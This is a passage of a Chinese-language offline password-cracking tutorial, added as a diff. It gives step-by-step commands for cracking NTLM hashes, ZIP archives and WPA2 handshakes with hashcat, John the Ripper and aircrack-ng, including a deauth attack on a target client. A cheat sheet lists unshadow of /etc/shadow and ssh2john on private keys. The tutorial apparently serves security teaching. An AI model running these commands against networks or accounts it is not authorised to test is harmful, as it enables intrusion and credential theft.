+  创建 /tmp/ntlm_only.txt：
+  31d6cfe0d16ae931b73c59d7e0c089c0
+  e19ccf75ee54e06b06a5907af13cef42
+
+Step 13: 用Hashcat破解NTLM：
+
+  hashcat -m 1000 -a 0 -o /tmp/cracked_ntlm.txt \
+    /tmp/ntlm_only.txt /usr/share/wordlists/rockyou.txt
+
+Step 14: 查看破解结果：
+
+  hashcat -m 1000 /tmp/ntlm_only.txt --show
+
+【练习3：压缩文件密码破解】
+
+Step 15: 创建一个密码保护的ZIP文件用于测试：
+
+  echo "secret data" > /tmp/test_file.txt
+  zip -e /tmp/secrets.zip /tmp/test_file.txt
+  # 输入密码: password123
+
+Step 16: 提取ZIP hash：
+
+  zip2john /tmp/secrets.zip > /tmp/zip_hash.txt
+
+Step 17: 使用John破解：
+
+  john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/zip_hash.txt
+
+Step 18: 查看结果：
+
+  john --show /tmp/zip_hash.txt
+
+Step 19: 或用Hashcat破解：
+
+  # 先查看hashcat模式
+  hashcat --help | grep -i zip
+
+  # 对于PKZIP压缩包
+  hashcat -m 17210 -a 0 /tmp/zip_hash.txt /usr/share/wordlists/rockyou.txt
+
+【练习4：WPA2 WiFi密码破解】
+
+Step 20: 用aircrack-ng捕获WPA握手包（这需要支持的无线网卡）：
+
+  注意：无线网络攻击需要额外设备，此练习侧重理解流程。
+
+  # 启用monitor模式
+  sudo airmon-ng start wlan0
+
+  # 扫描附近WiFi
+  sudo airodump-ng wlan0mon
+
+  # 捕获特定AP的握手包
+  sudo airodump-ng --bssid XX:XX:XX:XX:XX:XX -c 6 \
+    --write /tmp/wpa_capture wlan0mon
+
+  # 对目标客户端发送deauth使其重新连接
+  sudo aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX \
+    -c YY:YY:YY:YY:YY:YY wlan0mon
+
+Step 21: 将捕获的cap文件转换为hashcat格式：
+
+  hcxpcapngtool -o /tmp/wpa_hash.hc22000 /tmp/wpa_capture-01.cap
+
+Step 22: 破解WPA2密码：
+
+  # 基本掩码 (8位数字)
+  hashcat -m 22000 -a 3 /tmp/wpa_hash.hc22000 ?d?d?d?d?d?d?d?d
+
+  # 或字典攻击
+  hashcat -m 22000 -a 0 /tmp/wpa_hash.hc22000 \
+    /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+================================================================================
+  第六部分：性能优化与硬件配置
+================================================================================
+
+6.1 GPU选择和配置
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 1: 检查GPU设备：
+
+  # NVIDIA GPU
+  nvidia-smi
+
+  # 查看所有可用设备
+  hashcat -I
+
+Step 2: 选择合适的GPU：
+
+  # 使用特定GPU (NVIDIA)
+  hashcat -m 0 -a 0 -d 1 /tmp/hash.txt /tmp/dict.txt
+
+  # 使用多个GPU
+  hashcat -m 0 -a 0 -d 1,2 /tmp/hash.txt /tmp/dict.txt
+
+6.2 Workload Profile调优
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 3: 选择工作负载配置：
+
+  hashcat -m 0 -a 0 -w 3 /tmp/hash.txt /tmp/dict.txt
+
+  ┌──────────────────────────────────────────────────────┐
+  │ -w 1: Low      省电/低性能，日常办公时使用          │
+  │ -w 2: Default  默认，平衡性能和体验                  │
+  │ -w 3: High     忽视桌面响应，最大化性能              │
+  │ -w 4: Nightmare 仅限无桌面系统，纯粹追求速度         │
+  └──────────────────────────────────────────────────────┘
+
+Step 4: CPU版本（无GPU时）：
+
+  hashcat -m 0 -a 0 -D 1 /tmp/hash.txt /tmp/dict.txt
+
+  -D 1: 使用CPU设备
+  -D 2: 使用GPU设备
+
+================================================================================
+  附录：常用命令速查表
+================================================================================
+
+  Hashcat ────────────────────────────────────────────────
+  字典攻击:     hashcat -m [type] -a 0 [hashfile] [dict]
+  规则攻击:     hashcat -m [type] -a 0 [hashfile] [dict] -r [rulefile]
+  掩码攻击:     hashcat -m [type] -a 3 [hashfile] [mask]
+  混合攻击:     hashcat -m [type] -a 6 [hashfile] [dict] [mask]
+  组合攻击:     hashcat -m [type] -a 1 [hashfile] [dict1] [dict2]
+  查看结果:     hashcat -m [type] [hashfile] --show
+  性能测试:     hashcat -b
+  查看设备:     hashcat -I
+  恢复会话:     hashcat --session [name] --restore
+  指定设备:     hashcat -d [id] ...
+  指定GPU:      hashcat -d 1 ...
+  指定CPU:      hashcat -D 1 ...
+  负载:         hashcat -w [1-4] ...
+
+  John the Ripper ────────────────────────────────────────
+  基本破解:     john [hashfile]
+  字典破解:     john --wordlist=[dict] [hashfile]
+  规则破解:     john --wordlist=[dict] --rules [hashfile]
+  增量模式:     john --incremental [hashfile]
+  查看结果:     john --show [hashfile]
+  恢复会话:     john --restore
+  unshadow:     unshadow /etc/passwd /etc/shadow > [out]
+  zip2john:     zip2john [zip] > [hashfile]
+  rar2john:     rar2john [rar] > [hashfile]
+  pdf2john:     pdf2john [pdf] > [hashfile]
+  office2john:  office2john [docx] > [hashfile]
+  ssh2john:     ssh2john [id_rsa] > [hashfile]
+
+================================================================================
+  End of 02-离线密码破解大师课
+  下一教程：03-字典生成与密码分析.txt
+================================================================================
